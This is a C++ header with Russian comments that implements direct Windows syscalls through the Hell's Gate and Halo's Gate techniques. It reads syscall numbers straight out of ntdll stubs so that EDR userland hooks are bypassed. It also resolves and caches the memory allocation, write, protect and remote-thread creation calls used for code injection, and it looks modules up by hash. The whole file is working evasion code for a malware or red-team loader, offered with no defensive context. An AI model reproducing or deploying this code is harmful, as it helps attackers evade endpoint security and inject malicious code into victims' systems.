/**
 * syscalls.h — Direct syscalls через Hell's Gate (SSN резолвинг из ntdll).
 * Обходит userland hooks на ntdll — NtProtectVirtualMemory, NtAllocateVirtualMemory,
 * NtWriteVirtualMemory, NtCreateThreadEx читаются напрямую из stub-а ntdll.
 *
 * Архитектура: x64 Windows.
 * Компиляция: NASM / MASM для syscall_stub.asm или compile-time inline asm (MSVC).
 */
#pragma once
#include <windows.h>
#include <cstdint>
#include "peb_walk.h"

// ── SSN резолвинг через сканирование тела stub в ntdll ──────────────────────
// Стандартный ntdll stub:
//   4C 8B D1      mov r10, rcx
//   B8 xx 00 00 00 mov eax, <SSN>
//   ...
// Hell's Gate: читаем SSN напрямую из байтов stub.
// Halo's Gate: если stub заhookан (первый байт != 4C), ищем SSN у соседних функций.

struct SyscallEntry {
    uint32_t ssn;
    bool     resolved;
};

// Находим SSN из stub-а функции в ntdll.
// Если stub заhookан EDR (jmp at offset 0), используем Halo's Gate fallback.
inline SyscallEntry ResolveSSN(const char* fnName) {
    HMODULE ntdll = GetModuleByHash(MOD_HASH("ntdll.dll"));
    auto    fn    = reinterpret_cast<uint8_t*>(GetProcByHash(ntdll, HashStrRuntime(fnName)));
    if (!fn) return {0, false};

    // Hell's Gate: прямой читинг SSN
    // Проверяем классический пролог: 4C 8B D1 B8 xx 00 00 00
    if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 &&
        fn[3] == 0xB8 && fn[6] == 0x00 && fn[7] == 0x00) {
        uint32_t ssn = *reinterpret_cast<uint16_t*>(fn + 4);
        return {ssn, true};
    }

    // Halo's Gate fallback: ищем вперёд/назад по EAT-у соседние функции
    // (шаг ≈ 32 байта между соседними syscall stub-ами; SSN монотонно растёт)
    for (int delta = 1; delta < 500; delta++) {
        // Вперёд
        uint8_t* probe = fn + delta * 32;
        if (probe[0] == 0x4C && probe[1] == 0x8B && probe[2] == 0xD1 &&
            probe[3] == 0xB8 && probe[6] == 0x00 && probe[7] == 0x00) {
            uint32_t ssn = *reinterpret_cast<uint16_t*>(probe + 4) - delta;
            return {ssn, true};
        }
        // Назад
        probe = fn - delta * 32;
        if (probe[0] == 0x4C && probe[1] == 0x8B && probe[2] == 0xD1 &&
            probe[3] == 0xB8 && probe[6] == 0x00 && probe[7] == 0x00) {
            uint32_t ssn = *reinterpret_cast<uint16_t*>(probe + 4) + delta;
            return {ssn, true};
        }
    }
    return {0, false};
}

// ── Inline syscall dispatcher (x64, MSVC intrinsics) ─────────────────────────
// Вызываем syscall с произвольным SSN и до 8 аргументов.
// Аргументы: arg1=rcx, arg2=rdx, arg3=r8, arg4=r9, arg5..=stack (выровнен на 16).
//
// MSVC не имеет inline asm в x64 → используем __fastcall через extern "C" asm stub.
// Stub генерируется в syscall_stub.asm (MASM).

extern "C" NTSTATUS SyscallInvoke(uint32_t ssn, ...);

// ── Кэш SSN ──────────────────────────────────────────────────────────────────
struct SyscallCache {
    uint32_t NtAllocateVirtualMemory;
    uint32_t NtWriteVirtualMemory;
    uint32_t NtProtectVirtualMemory;
    uint32_t NtCreateThreadEx;
    uint32_t NtWaitForSingleObject;
    uint32_t NtFreeVirtualMemory;
    bool     initialized;

    static SyscallCache& Get() {
        static SyscallCache inst{};
        return inst;
    }

    bool Init() {
        if (initialized) return true;
        auto resolve = [](const char* n) -> uint32_t {
            auto e = ResolveSSN(n);
            return e.resolved ? e.ssn : 0;
        };
        NtAllocateVirtualMemory  = resolve("NtAllocateVirtualMemory");
        NtWriteVirtualMemory     = resolve("NtWriteVirtualMemory");
        NtProtectVirtualMemory   = resolve("NtProtectVirtualMemory");
        NtCreateThreadEx         = resolve("NtCreateThreadEx");
        NtWaitForSingleObject    = resolve("NtWaitForSingleObject");
        NtFreeVirtualMemory      = resolve("NtFreeVirtualMemory");
        initialized = NtAllocateVirtualMemory && NtWriteVirtualMemory &&
                      NtProtectVirtualMemory  && NtCreateThreadEx;
        return initialized;
    }
};
